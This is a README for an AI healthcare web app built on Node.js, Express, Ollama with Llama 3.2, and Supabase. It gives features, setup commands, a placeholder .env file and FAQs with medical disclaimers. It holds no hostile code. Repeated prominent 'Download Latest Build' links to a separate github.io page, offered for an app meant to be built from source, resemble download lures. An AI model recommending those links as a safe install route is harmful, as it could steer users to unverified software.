# AI Healthcare Assistant vLatest - Healthcare AI Web Application 2026

> **AI Healthcare Assistant is a responsive browser application that provides conversational healthcare tools, symptom discovery, medicine information, wellness calculations, appointment workflows, and emergency assistance. Its AI capabilities are powered by Ollama and Llama 3.2.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/dylangrayrdm376/ai-healthcare-assistant-app?style=flat-square)](https://github.com/dylangrayrdm376/ai-healthcare-assistant-app)

---

<p align="center">
  <a href="https://dylangrayrdm376.github.io/ai-healthcare-assistant-app/">
    <img src="https://img.shields.io/badge/Download-AI%20Healthcare%20Assistant%20Latest-brightgreen?style=for-the-badge" alt="Download AI Healthcare Assistant">
  </a>
</p>

> **[Download AI Healthcare Assistant Latest](https://dylangrayrdm376.github.io/ai-healthcare-assistant-app/)**

---

[Download Latest Build](https://dylangrayrdm376.github.io/ai-healthcare-assistant-app/)

---

## What AI Healthcare Assistant Provides

AI Healthcare Assistant gathers a range of healthcare-oriented utilities into a single web interface. It supports conversations with an AI assistant, guided symptom exploration, medicine information lookup, BMI calculations, appointment requests, emergency help resources, and a health dashboard for viewing related information and activity.

The system uses a responsive frontend alongside a Node.js and Express.js backend. Ollama with Llama 3.2 provides the AI layer, and Supabase may support application data and user workflows. Users can also use voice input, listen to spoken responses, revisit previous chats, copy generated responses, and save conversations as PDF files.

---

## Main Capabilities

- Conversational AI assistance for healthcare-related questions
- Guided symptom checking and symptom exploration
- Medicine guide for accessing medicine-related information
- BMI calculations for quick body-mass index results
- Workflow for requesting doctor appointments
- Emergency assistance area with urgent-help resources
- Health dashboard for viewing and organizing relevant information
- Voice-based input and spoken AI responses
- Chat history with copy and PDF export actions
- Layouts that adapt to desktop and mobile web browsers

---

## Getting Started

First clone the repository and enter its application directory:

```bash
git clone https://github.com/dylangrayrdm376/ai-healthcare-assistant-app.git
cd AI-Healthcare-Assistant
```

Install the project packages with npm:

```bash
npm install
```

After setting the necessary environment values, launch the Express.js server:

```bash
npm start
```

Visit the local URL displayed by the server in your browser. When the project is configured with a development command, use:

```bash
npm run dev
```

For local AI functionality, install Ollama separately, start its service, and ensure that the Llama 3.2 model is available to the application.

---

## Using the Application

1. Launch the Node.js server.
2. Visit the application in a supported modern browser.
3. Select a dashboard function, including AI Chat, Symptom Checker, Medicine Guide, BMI Calculator, or Appointment Booking.
4. Provide a typed message or use voice input if supported.
5. Read the returned answer or calculated result.
6. Copy responses, resume earlier discussions from chat history, or export a conversation as a PDF.
7. Open Emergency Assistance when you need the urgent-help information relevant to your circumstances.

The application is intended to provide healthcare-related tools and information. Its output should be considered in context and does not replace a qualified healthcare professional or local emergency services.

---

## Environment Configuration

Add a `.env` file at the project root and fill in the settings needed for your setup:

```env
PORT=3000
OLLAMA_BASE_URL=http://localhost:11434
OLLAMA_MODEL=llama3.2
SUPABASE_URL=your_supabase_url
SUPABASE_ANON_KEY=your_supabase_anon_key
```

The names used by the application can vary according to its configuration. Do not commit credentials to source control. Before testing AI functions, verify that Ollama is running, and change the model value if your local Ollama installation uses another model name.

---

## System Requirements

- Current web browser
- Node.js with npm
- Express.js runtime for the application
- Ollama for local AI operation
- Llama 3.2 installed and accessible through Ollama
- Supabase settings when database-backed functionality is enabled
- Network connectivity for externally hosted services used by the deployment
- Disk space for project files, installed dependencies, and created PDF downloads

---

## Frequently Asked Questions

### Must Ollama be installed?

Ollama is needed when local AI features are configured to use the Ollama integration. Its service must be active, with Llama 3.2 installed and available.

### How can I select another AI model?

Change the model setting in the environment configuration, then confirm that the replacement model is installed and recognized by Ollama.

### Where should application settings go?

Runtime configuration is normally kept in the root `.env` file. Values used to connect to Supabase should likewise be provided through environment variables.

### Does it work on mobile devices?

The interface uses responsive layouts intended for desktop and mobile browsers. Voice-related functionality depends on the browser and device capabilities available to the user.

### What should I check if no AI response appears?

Confirm that the Node.js server is active, Ollama can be reached at the configured URL, and the selected Llama model is installed. The server output may also contain useful connection or configuration errors.

### How do I submit a bug report or feature request?

Create an issue in the repository and include the affected feature, browser or runtime information, reproduction steps, and any relevant non-sensitive error output.

### Can this replace professional medical care?

No. AI Healthcare Assistant is a software tool for healthcare-related utilities and interactions. Consult a suitably qualified healthcare professional for medical decisions, and contact local emergency services for urgent situations.

---

## License

This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete license details.
